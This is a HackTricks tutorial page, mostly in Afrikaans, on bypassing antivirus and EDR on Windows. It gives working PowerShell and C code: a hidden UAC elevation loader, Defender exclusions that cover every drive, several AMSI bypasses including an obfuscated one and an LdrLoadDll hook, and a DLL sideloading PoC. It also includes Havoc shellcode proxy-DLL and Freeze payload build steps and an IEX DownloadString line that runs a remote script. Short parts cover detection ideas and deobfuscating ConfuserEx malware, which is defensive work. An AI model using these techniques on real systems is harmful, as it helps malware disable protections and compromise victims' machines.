# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender te laat ophou werk deur ’n ander AV na te boots.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokmiddel voordat daar aan Defender geknoei word

Openbare loaders wat as game cheats vermom is, word dikwels as ongetekende Node.js/Nexe-installeerders versprei wat eers die gebruiker om elevation vra en eers daarna Defender uitskakel. Die proses is eenvoudig:

1. Toets vir administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin rights het, dus dui ’n mislukking daarop dat die loader as ’n standaard gebruiker loop.
2. Herbegin onmiddellik self met die `RunAs`-verb om die verwagte UAC toestemmingsprompt te aktiveer, terwyl die oorspronklike command line behou word.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, dus word die bevestigingsprompt gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Algemene `MpPreference` uitsonderings vir elke stasieletter

Sodra verhoogde regte verkry is, maksimeer GachiLoader-style chains die blinde kolle van Defender in plaas daarvan om die diens heeltemal uit te skakel. Die loader maak eers die GUI watchdog dood (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters breë uitsonderings** sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Belangrike waarnemings:

- Die loop stap elke gemonteerde lêerstelsel deur (D:\, E:\, USB-stokkies, ens.) so **enige toekomstige payload wat eender waar op die skyf gedruppel word, word geïgnoreer**.
- Die uitsluiting vir die `.sys`-uitbreiding is vorentoe-gerig—aanvallers hou die opsie oop om later ongetekende drivers te laad sonder om Defender weer aan te raak.
- Alle veranderings beland onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wat later stadiums toelaat om te bevestig dat die uitsluitings voortbestaan of om dit uit te brei sonder om UAC weer te trigger.

Omdat geen Defender-diens gestop word nie, rapporteer naïewe gesondheidstoetse steeds “antivirus active” al raak die real-time inspeksie daardie paaie nooit aan nie.

## **AV Evasion Methodology**

Op die oomblik gebruik AVs verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: statiese deteksie, dinamiese analise, en vir die meer gevorderde EDRs, gedragsanalise.

### **Statiese deteksie**

Statiese deteksie word bereik deur bekende kwaadwillige stringe of bytes in 'n binêre of skrip te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat betrap, aangesien hulle waarskynlik al ontleed en as kwaadwillig gevlag is. Daar is 'n paar maniere om hierdie soort deteksie te omseil:

- **Encryption**

As jy die binêre enkripteer, sal daar geen manier wees vir AV om jou program te vind nie, maar jy sal 'n soort loader nodig hê om die program in geheue te ontsleutel en te laat loop.

- **Obfuscation**

Soms hoef jy net sommige stringe in jou binêre of skrip te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees afhangende van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion nagaan.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêre in 'n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou browser se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan bietjie moeiliker wees om mee te werk, maar hier is 'n paar dingetjies wat jy kan doen om sandbokse te omseil.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n uitstekende manier wees om AV se dinamiese analise te omseil. AV's het baie min tyd om lêers te skandeer sodat die gebruiker se werkvloei nie onderbreek word nie, so die gebruik van lang sleeps kan die analise van binêre ontwrig. Die probleem is dat baie AV-sandbokse die sleep net kan oor slaan afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het sandbokse baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kon vertraag. Jy kan hier ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierpunte te kontroleer; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie aan die "contoso.local" domein gekoppel is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program uitstap.

Dit blyk dat Microsoft Defender se Sandbox rekenaarnaam HAL9TH is, so jy kan vir die rekenaarnaam in jou malware kyk voor detonasie; as die naam HAL9TH ooreenstem, beteken dit jy is binne defender se sandbox, en dan kan jou program uitstap.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die benadering van Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie pos gesê het, sal **public tools** uiteindelik **gedetekteer word**, so jy moet jouself iets vra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander, minder bekende projek gebruik wat ook LSASS dump?

Die regte antwoord is waarskynlik die laaste. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van, indien nie die mees gevlagte stukkie malware deur AVs en EDRs nie; alhoewel die projek self baie gaaf is, is dit ook 'n nagmerrie om daarmee te werk om rondom AVs te kom, so kyk net vir alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads wysig vir ontduiking, maak seker dat jy **automatic sample submission** in defender uitskakel, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel langtermyn ontduiking is. As jy wil kyk of jou payload deur 'n bepaalde AV gedetekteer word, installeer dit op 'n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, **prioritiseer altyd die gebruik van DLLs vir ontduiking**; volgens my ervaring word DLL-lêers gewoonlik **veel minder gedetekteer** en ontleed, so dit is 'n baie eenvoudige truuk om in sommige gevalle deteksie te vermy (as jou payload natuurlik op een of ander manier as 'n DLL kan loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n deteksietempo van 4/26 op antiscan.me, terwyl die EXE-payload 'n 7/26 deteksietempo het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou wys ons 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stil te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL-soekorde wat deur die loader gebruik word deur beide die slagofferprogram en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme kontroleer wat vatbaar is vir DLL Sideloading deur [Siofra](https://github.com/Cybereason/siofra) te gebruik en die volgende powershell-skrip:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL files wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **verken DLL Hijackable/Sideloadable programs self**, hierdie tegniek is redelik onopvallend as dit behoorlik gedoen word, maar as jy publicly known DLL Sideloadable programs gebruik, kan jy maklik vasgevang word.

Net deur 'n malicious DLL met die naam wat 'n program verwag om te laai te plaas, sal nie jou payload laai nie, aangesien die program spesifieke funksies binne daardie DLL verwag. Om hierdie probleem reg te stel, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en malicious) DLL na die oorspronklike DLL, en behou sodoende die program se funksionaliteit en maak dit moontlik om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geenkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 opsporingsyfer by [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel sterk aan dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer diepgaande te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export-inskrywing 'n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer 'n oproeper die export oplos, sal die Windows-loader:

- Laai `TargetDll` indien dit nie reeds gelaai is nie
- Los `TargetFunc` daaruit op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit gelewer vanaf die beskermde KnownDLLs namespace (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak 'n indirekte sideloading-primitive moontlik: vind 'n ondertekende DLL wat 'n funksie exporteer wat na 'n nie-KnownDLL module-naam doorgestuur is, en plaas daardie ondertekende DLL saam met 'n aanvaller-beheerde DLL met presies dieselfde naam as die forwarded target module. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, wat jou DllMain uitvoer.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos deur die normale soekorde.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare map
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die voorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die doorstuur met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die laaier die deurverwysing na `NCRYPTPROV.SetAuditingInterface`
- Die laaier laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout ná `DllMain` reeds uitgevoer is

Hunting tips:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports uitken met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdedigingsidees:
- Hou dop vir LOLBins (bv. rundll32.exe) wat gesigneerde DLLs uit nie-stelselspaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basenaam uit daardie gids
- Waarsku by proses/module-kettings soos: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikerskryfbare paaie
- Dwing code-integriteitsbeleid af (WDAC/AppLocker) en weier skryf+uitvoer in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n heimlike wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat-en-muis spel; wat vandag werk kan môre opgespoor word, so vertrou nooit net op een hulpmiddel nie—indien moontlik, probeer om verskeie evasion-tegnieke te koppel.

## AMSI (Anti-Malware Scan Interface)

AMSI was geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **files on disk** skandeer, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit stel antivirusoplossings in staat om skripgedrag te inspekteer deur skripinhoud bloot te stel in 'n vorm wat beide unencrypted en unobfuscated is.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop dat dit `amsi:` vooran sit en dan die pad na die uitvoerbare lêer vanwaar die skrip gehardloop is, in hierdie geval, powershell.exe

Ons het geen lêer na skyf gedruppel nie, maar is steeds in-memory gevang as gevolg van AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

Daar is 'n paar maniere om om AMSI te kom:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met static detections werk, kan dit 'n goeie manier wees om die skripte wat jy probeer laai te wysig om detectie te ontduik.

Tog het AMSI die vermoë om skripte te unobfuscateer selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms is al wat nodig is om 'n paar veranderlike name te verander en jy sal goed wees, dit hang dus af hoeveel iets opgemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n onprivilegieerde gebruiker loop. Weens hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI skandering te ontduik.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles wat dit geverg het, was een reël powershell-kode om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gekenmerk, dus is 'n aanpassing nodig om hierdie tegniek te gebruik.

Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie pos uitkom, dus moet jy nie enige code publiseer as jou plan is om onopgemerk te bly.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokkeer AMSI deur die laai van amsi.dll te voorkom (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. 'n Robuuste, taalonafhanklike omseiling is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit en geen skanderings vind plaas vir daardie proses nie.

Implementasie-oorsig (x64 C/C++ pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Werk oor PowerShell, WScript/CScript en pasgemaakte loaders (alles wat andersins AMSI sou laai).
- Gebruik saam met die invoer van skripte via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is waargeneem in loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

Die instrument **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook skripte om AMSI te omseil.
Die instrument **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook skripte om AMSI te omseil deur handtekenings te vermy met gerandomiseerde gebruiker-gedefinieerde funksies, veranderlikes, karakteruitdrukkings en deur ewekansige karaktergrootte (case) op PowerShell-sleutelwoorde toe te pas om handtekenings te vermy.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n instrument soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie instrument werk deur die geheue van die huidige proses te deursoek vir die AMSI-handtekening en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, daarom kan jy jou skripte uitvoer sonder dat AMSI dit skandeer. Jy kan dit soos volg doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell commands wat op 'n stelsel uitgevoer word, te registreer. Dit kan nuttig wees vir oudits en foutopsporing, maar dit kan ook 'n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Verskeie obfuscation techniques staatmaak op die enkripsie van data, wat die entropie van die binêr sal verhoog en dit vir AVs en EDRs makliker sal maak om dit te detect. Wees versigtig hiermee en oorweeg om enkripsie slegs toe te pas op spesifieke gedeeltes van jou kode wat sensitief is of weggesteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te tref wat dekompilers en sandboxes blokkeer. Die onderstaande werkvloei herstel betroubaar 'n byna oorspronklike IL wat daarna na C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en ontsleutel dit binne die *module* static constructor (`<Module>.cctor`). Dit pleeg ook 'n aanpassing van die PE checksum sodat enige wysiging die binêr sal laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te vind, die XOR keys te herstel en 'n skoon assembly te skryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitvoer bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Vlagte:
• `-p crx` – kies die ConfuserEx 2 profiel  
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en veranderlike name herstel en konstante stringe ontsleutel.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (a.k.a *proxy calls*) om dekompilasie verder te breek. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van opake wrapper funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resulterende binêr onder dnSpy, soek na groot Base64 blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *real* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-encoded byte array geïnitialiseer binne `<Module>.byte_0`.

Die bogenoemde ketting herstel die uitvoerstroom **sonder** om die malicious sample te moet loop – handig wanneer jy op 'n offline workstation werk.

> 🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasie-suite te verskaf wat verbeterde sagteware-sekuriteit kan bied deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens kompilasie, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik of die compiler te verander.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming raamwerk, wat die lewe van die persoon wat die application wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE files kan obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation raamwerk vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op assembly code-vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike idee van normale control flow teengaan.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere executables van die internet afgelaai en uitgevoer het.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputation-based benadering, wat beteken dat seldsame afgelaaide applications SmartScreen sal trigger, wat waarsku en die eindgebruiker verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur te klik More Info -> Run anyway).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat executables wat onderteken is met 'n **trusted** signing certificate **nie SmartScreen sal trigger nie**.

